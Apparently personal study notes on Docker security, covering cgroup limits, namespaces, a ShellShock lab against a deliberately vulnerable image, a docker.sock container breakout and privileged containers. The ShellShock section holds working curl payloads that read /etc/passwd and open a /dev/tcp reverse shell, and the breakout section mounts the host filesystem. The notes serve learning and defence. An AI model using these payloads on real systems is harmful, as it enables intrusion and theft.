Cgroups
	allows to limit processes and containers access to system resources like cpu, memory, iops and network

	find container cgroups
	
```

docker run -itd --name test alpine

docker inspect container name | grep {Id}
find /sys/fs/cgroup/ -name {container id}


# check how many processes can be created 
cd /sys/fs/cgroup/pids/docker/{containerid} 

cat pids.max 
max # max number of processes can be created

# create limits
docker run -itd --name test --pids-limit 6 alpine

cat pids.max
6

[root@centos0 spothi]# docker exec -it test sh
/ # sleep 5 & sleep 5 & sleep 5 & sleep 5 # 5 parallel processes
[3]+  Done                       sleep 5
[2]+  Done                       sleep 5
[1]+  Done                       sleep 5
/ # sleep 5 & sleep 5 & sleep 5 & sleep 5 & sleep 5
sh: can't fork: Resource temporarily unavailable # 6 parallel processes
/ #
```

## Namespaces
	Linux kernel features
	docker uses namespaces concept to isolate container from host
![](https://i.imgur.com/TRefoca.png)


## Shell shock vulnerability
```
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271

curl http://192.168.20.30:8080
<html>
    <head><title>Vulnerables | ShellShock</title></head>
    <body>
        <h1>This image is vulnerable to ShellShock, please exploit it</h1>
        <pre>The script is at /cgi-bin/vulnerable</pre>
    </body>
</html>

# get passwd file from the host
curl -H "user-agent: () { :;}; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.20.30:8080/cgi-bin/vulnerable

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh

# reverse shell

# start netcat listner
nc -lvp 4444 # could be on the same or different machine

curl -H "user-agent: () { :;}; echo; echo; /bin/bash -i >& /dev/tcp/192.168.20.30/4444 0>&1" http://192.168.20.30:8080/cgi-bin/vulnerable


nc -lvp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.4.
Ncat: Connection from 172.17.0.4:59050.
www-data@3a9ce64e8ac1:/usr/lib/cgi-bin$ # got reverse shell


# check where you are 
# if container it would look something similar like the following
cat /proc/self/cgroup
12:rdma:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
11:freezer:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
10:perf_event:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
9:devices:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
8:memory:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
7:blkio:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
6:net_cls,net_prio:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
5:pids:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
4:cpuset:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
3:hugetlb:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
2:cpu,cpuacct:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2
1:name=systemd:/docker/3a9ce64e8ac169bda16d97884497cd4af89151aa4362c7fc6252b82c54e084c2


```


## Privilege Escalation using volume mounts

User is not root user but part of docker group
![](https://i.imgur.com/wENtmYj.png)

the shell script escalates the permission![](https://i.imgur.com/mo5swmd.png)

its part of root group now

## Container breakouts
Get out of the containers
- old installations of docker
- container over priviledged - CAP_SYS_ADMIN, CAP_SYS_MODULE
- container mounting /var/run/docker.sock

```
docker run -itd --name sock -v /var/run/docker.sock:/var/run/docker.soc alpine

docker run -itd --name sock -v /var/run/docker.sock:/var/run/docker.sock alpine
5db014e2b62b357e229375d75af3d65815704a20ec8480c19c0cb5bbe5168eda
[root@centos0 spothi]# docker exec -it sock sh
/ # ls /var/run/docker.sock
/var/run/docker.sock

/ # apk update
/ # apk add -u docker
/ # docker -H unix://var/run/docker.sock run -it -v /:/test:ro -t alpine sh # mounting host system root dir to /test
/ # ls /test
bin    dev    home   lib64  mnt    proc   run    srv    tmp    var
boot   etc    lib    media  opt    root   sbin   sys    usr
/ # cat /test/etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
```

## Privileged containers
```
docker run -itd -name privi --priviledged alpine
docker exec -it privi sh
apk add -U libcap
capsh --print # get a list of all capabilities for that container

```

https://github.com/docker/docker-bench-security - Checks for best practices on host side config
```
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo sh docker-bench-security.sh


docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /usr/bin/containerd:/usr/bin/containerd:ro \
    -v /usr/bin/runc:/usr/bin/runc:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    --label docker_bench_security \
    docker/docker-bench-security
```